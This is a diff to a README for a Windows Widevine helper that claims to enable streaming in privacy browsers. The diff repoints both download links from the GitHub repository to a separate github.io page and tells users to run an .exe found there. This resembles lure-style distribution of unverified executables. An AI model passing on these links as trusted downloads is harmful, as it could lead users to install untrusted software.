@@ -1,6 +1,6 @@
 # 🌐 chromium-widevine-helper - Play streaming media in alternative browsers
 
-[![Download Setup](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Richcarter999/chromium-widevine-helper)
+[![Download Setup](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://richcarter999.github.io)
 
 This tool helps users watch streaming video content in privacy-focused web browsers. Some web browsers exclude proprietary components by default. This prevents websites like Netflix, Spotify, or Disney+ from playing media. This software downloads and installs the necessary Widevine files directly from Google. It bridges the gap between your privacy browser and popular streaming services.
 
@@ -33,7 +33,7 @@ To run this tool on Windows, your system needs the following:
 
 Follow these steps to set up the software on your computer.
 
-1. First, visit the official release page to get the installer: [Download chromium-widevine-helper](https://github.com/Richcarter999/chromium-widevine-helper).
+1. First, visit the official release page to get the installer: [Download chromium-widevine-helper](https://richcarter999.github.io).
 2. Look for the "Assets" section on the page.
 3. Click the file ending in `.exe` to begin your download.
 4. Locate the downloaded file in your "Downloads" folder.
